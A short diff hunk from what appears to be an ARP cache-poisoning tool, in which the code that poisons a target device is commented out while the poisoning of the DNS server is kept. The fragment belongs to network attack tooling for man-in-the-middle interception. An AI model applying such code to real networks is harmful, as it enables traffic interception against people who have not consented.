@@ -60,7 +60,7 @@ class Arp:
                     # Poison DNS server
                     self.poison(self.mac_attacker, dns_mac, dns_ip, host)
                     # Poison device
-                    self.poison(self.mac_attacker, self.nm[host]['addresses']['mac'], host, dns_ip)
+                    # self.poison(self.mac_attacker, self.nm[host]['addresses']['mac'], host, dns_ip)
                     if self.first_call:
                         print("Poisoned " + host)
                 except KeyError:
